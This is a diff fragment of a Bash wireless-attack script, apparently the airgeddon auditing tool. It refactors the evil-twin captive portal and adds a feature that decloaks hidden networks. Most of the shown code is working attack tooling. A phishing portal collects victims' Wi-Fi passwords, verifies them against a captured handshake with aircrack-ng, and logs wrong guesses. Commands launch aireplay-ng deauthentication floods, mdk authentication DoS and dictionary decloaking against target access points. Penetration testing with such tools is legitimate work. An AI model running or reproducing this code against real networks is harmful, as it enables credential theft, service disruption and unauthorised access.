+				echo -e "\t\${done_msg}"
 
-	cat >&7 <<-EOF
+				if [ "\${attempts_number}" -gt 0 ]; then
 					{
 					echo ""
 					echo "---------------"
@@ -11178,15 +11159,9 @@ function set_et_control_script() {
 					echo ""
 					} >> "${et_captive_portal_logpath}"
 					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)
-	EOF
 
-	cat >&7 <<-'EOF'
-					for badpass in "${BADPASSWORDS[@]}"; do
-						echo "${badpass}" >>\
-	EOF
-
-	cat >&7 <<-EOF
-						"${et_captive_portal_logpath}"
+					for badpass in "\${BADPASSWORDS[@]}"; do
+						echo "\${badpass}" >> "${et_captive_portal_logpath}"
 					done
 				fi
 
@@ -11198,9 +11173,6 @@ function set_et_control_script() {
 				} >> "${et_captive_portal_logpath}"
 
 				sleep 2
-	EOF
-
-	cat >&7 <<-'EOF'
 				kill_et_processes_control_script
 	EOF
 
@@ -11214,12 +11186,10 @@ function set_et_control_script() {
 				exit 0
 			}
 		fi
-	EOF
 
-	cat >&7 <<-'EOF'
-		date_counter=$(date +%s)
+		date_counter=\$(date +%s)
 		while true; do
-			et_control_window_channel=$(cat "${path_to_channelfile}" 2> /dev/null)
+			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
 	EOF
 
 	case ${et_mode} in
@@ -11241,92 +11211,64 @@ function set_et_control_script() {
 			echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
 			echo
 			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
-	EOF
 
-	cat >&7 <<-'EOF'
-			hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
-			mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
-			secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
-			echo -e "\t${hours}:${mins}:${secs}"
-	EOF
-
-	cat >&7 <<-EOF
+			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
+			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
+			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
+			echo -e "\t\${hours}:\${mins}:\${secs}"
 			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
-	EOF
 
-	cat >&7 <<-'EOF'
-			if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
-	EOF
-
-	cat >&7 <<-EOF
+			if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
 				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
 					clear
 					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
 					echo
 					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
-	EOF
-
-	cat >&7 <<-'EOF'
-					echo -e "\t${hours}:${mins}:${secs}"
+					echo -e "\t\${hours}:\${mins}:\${secs}"
 					echo
 					finish_evil_twin
 				else
-					attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
-					last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
-					tput el && echo -ne "\t${attempts_text} ${attempts_number}"
-					if [ "${attempts_number}" -gt 0 ]; then
-	EOF
+					attempts_number=\$((cat < "\${attempts_path}" | wc -l) 2> /dev/null)
+					last_password=\$(grep "." "\${attempts_path}" 2> /dev/null | tail -1)
+					tput el && echo -ne "\t\${attempts_text} \${attempts_number}"
 
-	cat >&7 <<-EOF
+					if [ "\${attempts_number}" -gt 0 ]; then
 						open_parenthesis="${yellow_color}(${normal_color}"
 						close_parenthesis="${yellow_color})${normal_color}"
-	EOF
-
-	cat >&7 <<-'EOF'
-						echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
+						echo -ne " \${open_parenthesis} \${last_password_msg} \${last_password} \${close_parenthesis}"
 					fi
 				fi
 				echo
 				echo
 			fi
-	EOF
 
-	cat >&7 <<-EOF
 			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
 			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
 			client_ips=()
-	EOF
 
-	cat >&7 <<-'EOF'
-			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
-	EOF
-
-	cat >&7 <<-EOF
+			#shellcheck disable=SC2199
+			if [[ -z "\${DHCPCLIENTS[@]}" ]]; then
 				echo -e "\t${et_misc_texts[${language},7]}"
 			else
-	EOF
-
-	cat >&7 <<-'EOF'
-				for client in "${DHCPCLIENTS[@]}"; do
-					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
-					if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
+				for client in "\${DHCPCLIENTS[@]}"; do
+					[[ \${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="\${BASH_REMATCH[1]}" && client_mac="\${BASH_REMATCH[2]}"
+					if [[ " \${client_ips[*]} " != *" \${client_ip} "* ]]; then
 						client_hostname=""
-						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
-						if [[ -z "${client_hostname}" ]]; then
-							echo -ne "\t${client_ip} ${client_mac}"
+						[[ \${client} =~ .*(\(.+\)).* ]] && client_hostname="\${BASH_REMATCH[1]}"
+						if [[ -z "\${client_hostname}" ]]; then
+							echo -ne "\t\${client_ip} \${client_mac}"
 						else
-							echo -ne "\t${client_ip} ${client_mac} ${client_hostname}"
+							echo -ne "\t\${client_ip} \${client_mac} \${client_hostname}"
 						fi
-	EOF
 
-	cat >&7 <<-EOF
-						if [ "${right_arping}" -eq 1 ]; then
+						if [ "\${right_arping}" -eq 1 ]; then
 							if "${right_arping_command}" -C 3 -I "${interface}" -w 5 -p -q "\${client_ip}"; then
 								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${green_color} ✓${normal_color}"
 							else
 								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${red_color} ✘${normal_color}"
 							fi
 						fi
+
 						if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
 							if grep -qE "^\${client_ip} 200 GET /${pixelfile}" "${tmpdir}${webserver_log}" > /dev/null 2>&1; then
 								echo -ne " ${blue_color}${et_misc_texts[${language},28]}${green_color} ✓${normal_color}"
@@ -11335,18 +11277,17 @@ function set_et_control_script() {
 							fi
 						fi
 						echo -ne "\n"
-	EOF
-
-	cat >&7 <<-'EOF'
 					fi
-					client_ips+=(${client_ip})
+					client_ips+=("\${client_ip}")
 				done
 			fi
+
 			echo -ne "\033[K\033[u"
 			sleep 1
-			current_window_size="$(tput cols)x$(tput lines)"
-			if [ "${current_window_size}" != "${stored_window_size}" ]; then
-				stored_window_size="${current_window_size}"
+
+			current_window_size="\$(tput cols)x\$(tput lines)"
+			if [ "\${current_window_size}" != "\${stored_window_size}" ]; then
+				stored_window_size="\${current_window_size}"
 				clear
 			fi
 		done
@@ -11380,7 +11321,7 @@ function launch_dns_blackhole() {
 	echo -e "no-hosts"
 	} >> "${tmpdir}${dnsmasq_file}"
 
-	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
+	manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		et_processes+=($!)
 	else
@@ -11734,6 +11675,7 @@ function set_captive_portal_page() {
 
 	cat >&4 <<-EOF
 		#!/usr/bin/env bash
+
 		echo '<!DOCTYPE html>'
 		echo '<html>'
 		echo -e '\t<head>'
@@ -11745,75 +11687,42 @@ function set_captive_portal_page() {
 		echo -e '\t<body>'
 		echo -e '\t\t<div class="content">'
 		echo -e '\t\t\t<center><p>'
-	EOF
 
-	cat >&4 <<-'EOF'
-		POST_DATA=$(cat /dev/stdin)
-		if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ "${CONTENT_LENGTH}" -gt 0 ]]; then
-			POST_DATA=${POST_DATA#*=}
-			password=${POST_DATA//+/ }
-			password=${password//[*&\/?<>]}
-			password=$(printf '%b' "${password//%/\\x}")
-			password=${password//[*&\/?<>]}
+		POST_DATA=\$(cat /dev/stdin)
+		if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
+			POST_DATA=\${POST_DATA#*=}
+			password=\${POST_DATA//+/ }
+			password=\${password//[*&\/?<>]}
+			password=\$(printf '%b' "\${password//%/\\\x}")
+			password=\${password//[*&\/?<>]}
 		fi
 
-		if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
-	EOF
-
-	cat >&4 <<-EOF
+		if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
 			rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-	EOF
-
-	cat >&4 <<-'EOF'
-			echo "${password}" >\
-	EOF
-
-	cat >&4 <<-EOF
-			"${tmpdir}${webdir}${currentpassfile}"
-			aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
-	EOF
-
-	cat >&4 <<-'EOF'
-			if [ "$?" = "0" ]; then
-	EOF
-
-	cat >&4 <<-EOF
+			echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+			if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
 				touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 				echo '${et_misc_texts[${captive_portal_language},18]}'
 				et_successful=1
 			else
-	EOF
-
-	cat >&4 <<-'EOF'
-				echo "${password}" >>\
-	EOF
-
-	cat >&4 <<-EOF
-				"${tmpdir}${webdir}${attemptsfile}"
+				echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
 				echo '${et_misc_texts[${captive_portal_language},17]}'
 				et_successful=0
 			fi
-	EOF
-
-	cat >&4 <<-'EOF'
-		elif [[ "${#password}" -gt 0 ]] && [[ "${#password}" -lt 8 ]]; then
-	EOF
-
-	cat >&4 <<-EOF
+		elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
 			echo '${et_misc_texts[${captive_portal_language},26]}'
 			et_successful=0
 		else
 			echo '${et_misc_texts[${captive_portal_language},14]}'
 			et_successful=0
 		fi
+
 		echo -e '\t\t\t</p></center>'
 		echo -e '\t\t</div>'
 		echo -e '\t</body>'
 		echo '</html>'
-	EOF
 
-	cat >&4 <<-'EOF'
-		if [ "${et_successful}" -eq 1 ]; then
+		if [ "\${et_successful}" -eq 1 ]; then
 			exit 0
 		else
 			echo '<script type="text/javascript">'
@@ -11834,7 +11743,7 @@ function launch_webserver() {
 
 	recalculate_windows_sizes
 	lighttpd_window_position=${g4_bottomright_window}
-	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
+	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		et_processes+=($!)
 	else
@@ -12148,7 +12057,7 @@ function launch_beef() {
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
 		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
-		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
+		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "cd ${beef_path} && ./beef -c \"${beef_file}\"" "BeEF"
 		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 			cd "${beef_path}"
 			get_tmux_process_id "./beef -c \"${beef_file}\""
@@ -12156,7 +12065,7 @@ function launch_beef() {
 			global_process_pid=""
 		fi
 	else
-		manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[17]}" "BeEF"
+		manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g4_middleright_window} -T \"BeEF\"" "${optional_tools_names[17]}" "BeEF"
 		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 			get_tmux_process_id "{optional_tools_names[18]}"
 			et_processes+=("${global_process_pid}")
@@ -12215,7 +12124,7 @@ function launch_bettercap_sniffing() {
 		fi
 	fi
 
-	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"${bettercap_window_title}\"" "${bettercap_cmd}" "${bettercap_window_title}"
+	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"${bettercap_window_title}\"" "${bettercap_cmd}" "${bettercap_window_title}"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		local bettercap_cmd_clean_for_pid_finding
 		bettercap_cmd_clean_for_pid_finding=$(echo "${bettercap_cmd}" | sed 's/ |.*//')
@@ -12478,14 +12387,14 @@ function convert_cap_to_hashcat_format() {
 	fi
 }
 
-#Handshake/PMKID tools menu
-function handshake_pmkid_tools_menu() {
+#Handshake/PMKID/Decloaking tools menu
+function handshake_pmkid_decloaking_tools_menu() {
 
 	debug_print
 
 	clear
 	language_strings "${language}" 120 "title"
-	current_menu="handshake_pmkid_tools_menu"
+	current_menu="handshake_pmkid_decloaking_tools_menu"
 	initialize_menu_and_print_selections
 	echo
 	language_strings "${language}" 47 "green"
@@ -12498,8 +12407,10 @@ function handshake_pmkid_tools_menu() {
 	language_strings "${language}" 124 "separator"
 	language_strings "${language}" 663 pmkid_dependencies[@]
 	language_strings "${language}" 121
-	print_simple_separator
 	language_strings "${language}" 122 clean_handshake_dependencies[@]
+	language_strings "${language}" 727 "separator"
+	language_strings "${language}" 725
+	language_strings "${language}" 726 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " handshake_option
@@ -12517,7 +12428,7 @@ function handshake_pmkid_tools_menu() {
 			managed_option "${interface}"
 		;;
 		4)
-			explore_for_targets_option "WPA"
+			explore_for_targets_option
 		;;
 		5)
 			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
@@ -12549,12 +12460,22 @@ function handshake_pmkid_tools_menu() {
 				clean_handshake_file_option
 			fi
 		;;
+		8)
+			decloak_prequisites "deauth"
+		;;
+		9)
+			if contains_element "${handshake_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				decloak_prequisites "dictionary"
+			fi
+		;;
 		*)
 			invalid_menu_option
 		;;
 	esac
 
-	handshake_pmkid_tools_menu
+	handshake_pmkid_decloaking_tools_menu
 }
 
 #Execute the cleaning of a Handshake file
@@ -12623,10 +12544,10 @@ function dos_attacks_menu() {
 	language_strings "${language}" 50 "separator"
 	language_strings "${language}" 51 mdk_attack_dependencies[@]
 	language_strings "${language}" 52 aireplay_attack_dependencies[@]
-	language_strings "${language}" 53 mdk_attack_dependencies[@]
+	language_strings "${language}" 63 mdk_attack_dependencies[@]
 	language_strings "${language}" 54 "separator"
 	language_strings "${language}" 62 mdk_attack_dependencies[@]
-	language_strings "${language}" 63 mdk_attack_dependencies[@]
+	language_strings "${language}" 53 mdk_attack_dependencies[@]
 	language_strings "${language}" 64 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
@@ -12665,7 +12586,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				wds_confusion_option
+				auth_dos_option
 			fi
 		;;
 		8)
@@ -12679,7 +12600,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				auth_dos_option
+				wds_confusion_option
 			fi
 		;;
 		10)
@@ -12706,7 +12627,7 @@ function capture_handshake_evil_twin() {
 		return 1
 	fi
 
-	ask_timeout "capture_handshake"
+	ask_timeout "capture_handshake_decloak"
 	capture_handshake_window
 
 	case ${et_dos_attack} in
@@ -12733,11 +12654,11 @@ function capture_handshake_evil_twin() {
 			fi
 			sleeptimeattack=12
 		;;
-		"Wds Confusion")
+		"Auth DoS")
 			recalculate_windows_sizes
-			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-				get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+				get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
 				processidattack="${global_process_pid}"
 				global_process_pid=""
 			fi
@@ -12786,6 +12707,82 @@ function capture_handshake_evil_twin() {
 	esac
 }
 
+#Decloak ESSID by deauthentication or by dictionary on Handshake/PMKID/Decloak tools
+function decloak_prequisites() {
+
+	debug_print
+
+	if [[ "${essid}" != "(Hidden Network)" ]] || [[ -z ${channel} ]]; then
+		echo
+		language_strings "${language}" 731 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
+	if ! check_monitor_enabled "${interface}"; then
+		echo
+		language_strings "${language}" 14 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
+	if [ "${channel}" -gt 14 ]; then
+		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+			echo
+			language_strings "${language}" 515 "red"
+			language_strings "${language}" 115 "read"
+			return 1
+		fi
+	fi
+
+	echo
+	language_strings "${language}" 730 "yellow"
+	language_strings "${language}" 115 "read"
+
+	if [ "${1}" = "deauth" ]; then
+		dos_handshake_decloaking_menu "decloak"
+	else
+		manage_asking_for_dictionary_file
+
+		echo
+		language_strings "${language}" 737 "blue"
+		language_strings "${language}" 115 "read"
+
+		exec_decloak_by_dictionary
+	fi
+}
+
+#Execute mdk decloak by dictionary
+function exec_decloak_by_dictionary() {
+
+	debug_print
+
+	iw "${interface}" set channel "${channel}" > /dev/null 2>&1
+
+	local unbuffer
+	unbuffer=""
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		unbuffer="stdbuf -i0 -o0 -e0 "
+	fi
+
+	rm -rf "${tmpdir}decloak.log" > /dev/null 2>&1
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g1_topright_window} -T \"decloack by dictionary\"" "${unbuffer}${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY} | tee ${tmpdir}decloak.log ${colorize}" "decloack by dictionary" "active"
+	wait_for_process "${mdk_command} ${interface} p -t ${bssid} -f ${DICTIONARY}" "decloack by dictionary"
+
+	if check_essid_in_mdk_decloak_log; then
+		echo
+		language_strings "${language}" 162 "yellow"
+		echo
+		language_strings "${language}" 736 "blue"
+		language_strings "${language}" 115 "read"
+	else
+		echo
+		language_strings "${language}" 738 "red"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Capture Handshake on Handshake/PMKID tools
 function capture_pmkid_handshake() {
 
@@ -12825,7 +12822,7 @@ function capture_pmkid_handshake() {
 	language_strings "${language}" 115 "read"
 
 	if [ "${1}" = "handshake" ]; then
-		dos_handshake_menu
+		dos_handshake_decloaking_menu "${1}"
 	else
 		launch_pmkid_capture
 	fi
@@ -13242,18 +13239,23 @@ function read_path() {
 	return "${validpath}"
 }
 
-#Launch the DoS selection menu before capture a Handshake and process the captured file
-function dos_handshake_menu() {
+#Launch the DoS selection menu before capture a Handshake or decloak a network and process the captured file
+function dos_handshake_decloaking_menu() {
 
 	debug_print
 
-	if [ "${return_to_handshake_pmkid_tools_menu}" -eq 1 ]; then
+	if [ "${return_to_handshake_pmkid_decloaking_tools_menu}" -eq 1 ]; then
 		return
 	fi
 
 	clear
-	language_strings "${language}" 138 "title"
-	current_menu="dos_handshake_menu"
+	if [ "${1}" = "decloak" ]; then
+		language_strings "${language}" 732 "title"
+	else
+		language_strings "${language}" 138 "title"
+	fi
+
+	current_menu="dos_handshake_decloak_menu"
 	initialize_menu_and_print_selections
 	echo
 	language_strings "${language}" 47 "green"
@@ -13265,17 +13267,21 @@ function dos_handshake_menu() {
 	language_strings "${language}" 141 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
-	read -rp "> " attack_handshake_option
-	case ${attack_handshake_option} in
+	read -rp "> " attack_handshake_decloak_option
+	case ${attack_handshake_decloak_option} in
 		0)
 			return
 		;;
 		1)
-			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
+			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				ask_timeout "capture_handshake"
-				capture_handshake_window
+				ask_timeout "capture_handshake_decloak"
+				if [ "${1}" = "decloak" ]; then
+					decloak_window
+				else
+					capture_handshake_window
+				fi
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
@@ -13286,15 +13292,23 @@ function dos_handshake_menu() {
 					global_process_pid=""
 				fi
 				sleeptimeattack=12
-				launch_handshake_capture
+				if [ "${1}" = "decloak" ]; then
+					launch_decloak_capture
+				else
+					launch_handshake_capture
+				fi
 			fi
 		;;
 		2)
-			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
+			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				ask_timeout "capture_handshake"
-				capture_handshake_window
+				ask_timeout "capture_handshake_decloak"
+				if [ "${1}" = "decloak" ]; then
+					decloak_window
+				else
+					capture_handshake_window
+				fi
 				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
@@ -13304,24 +13318,36 @@ function dos_handshake_menu() {
 					global_process_pid=""
 				fi
 				sleeptimeattack=12
-				launch_handshake_capture
+				if [ "${1}" = "decloak" ]; then
+					launch_decloak_capture
+				else
+					launch_handshake_capture
+				fi
 			fi
 		;;
 		3)
-			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
+			if contains_element "${attack_handshake_decloak_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				ask_timeout "capture_handshake"
-				capture_handshake_window
+				ask_timeout "capture_handshake_decloak"
+				if [ "${1}" = "decloak" ]; then
+					decloak_window
+				else
+					capture_handshake_window
+				fi
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+					get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
 					processidattack="${global_process_pid}"
 					global_process_pid=""
 				fi
 				sleeptimeattack=16
-				launch_handshake_capture
+				if [ "${1}" = "decloak" ]; then
+					launch_decloak_capture
+				else
+					launch_handshake_capture
+				fi
 			fi
 		;;
 		*)
@@ -13329,7 +13355,35 @@ function dos_handshake_menu() {
 		;;
 	esac
 
-	dos_handshake_menu
+	dos_handshake_decloaking_menu "${1}"
+}
+
+#Decloak capture launcher
+function launch_decloak_capture() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		processidattack=$!
+		sleep "${sleeptimeattack}" && kill "${processidattack}" &> /dev/null
+	else
+		sleep "${sleeptimeattack}" && kill "${processidattack}" && kill_tmux_windows "Decloaking" &> /dev/null
+	fi
+
+	decloak_check
+
+	if check_essid_in_capture_file; then
+		echo
+		language_strings "${language}" 162 "yellow"
+		echo
+		language_strings "${language}" 736 "blue"
+		language_strings "${language}" 115 "read"
+		return_to_handshake_pmkid_decloaking_tools_menu=1
+	else
+		echo
+		language_strings "${language}" 146 "red"
+		language_strings "${language}" 115 "read"
+	fi
 }
 
 #Handshake capture launcher
@@ -13364,7 +13418,7 @@ function launch_handshake_capture() {
 			echo
 			language_strings "${language}" 149 "blue"
 			language_strings "${language}" 115 "read"
-			return_to_handshake_pmkid_tools_menu=1
+			return_to_handshake_pmkid_decloaking_tools_menu=1
 		;;
 		"1")
 			echo
@@ -13386,6 +13440,31 @@ function is_wpa2_handshake() {
 	return $?
 }
 
+#Launch the Decloak window
+function decloak_window() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 734 "blue"
+	echo
+	language_strings "${language}" 735 "yellow"
+	language_strings "${language}" 115 "read"
+	echo
+	language_strings "${language}" 325 "blue"
+
+	rm -rf "${tmpdir}decloak"* > /dev/null 2>&1
+	recalculate_windows_sizes
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Decloaking\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}decloak ${interface}" "Decloaking" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}decloak ${interface}"
+		processiddecloak="${global_process_pid}"
+		global_process_pid=""
+	else
+		processiddecloak=$!
+	fi
+}
+
 #Launch the Handshake capture window
 function capture_handshake_window() {
 
@@ -13401,7 +13480,7 @@ function capture_handshake_window() {
 
 	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
 	recalculate_windows_sizes
-	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
 		processidcapture="${global_process_pid}"
@@ -13448,7 +13527,7 @@ function launch_pmkid_capture() {
 	fi
 
 	recalculate_windows_sizes
-	manage_output "+j -sb -rightbar -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Capturing PMKID\"" "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} ${hcxdumptool_parameters}" "Capturing PMKID" "active"
+	manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Capturing PMKID\"" "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} ${hcxdumptool_parameters}" "Capturing PMKID" "active"
 	wait_for_process "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} ${hcxdumptool_parameters}" "Capturing PMKID"
 
 	if hcxpcapngtool -o "${tmpdir}${standardpmkid_filename}" "${tmpdir}pmkid.pcapng" | grep -Eq "PMKID(\(s\))? written" 2> /dev/null; then
@@ -14449,7 +14528,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Wds Confusion"
+				et_dos_attack="Auth DoS"
 
 				echo
 				language_strings "${language}" 509 "yellow"
@@ -14933,7 +15012,7 @@ function get_hcxdumptool_version() {
 
 	debug_print
 
-	hcxdumptool_version=$(hcxdumptool --version | awk '{print $2}')
+	hcxdumptool_version=$(hcxdumptool --version | awk 'NR == 1 {print $2}')
 }
 
 #Determine beef version
@@ -15830,18 +15909,18 @@ function check_update_tools() {
 	debug_print
 
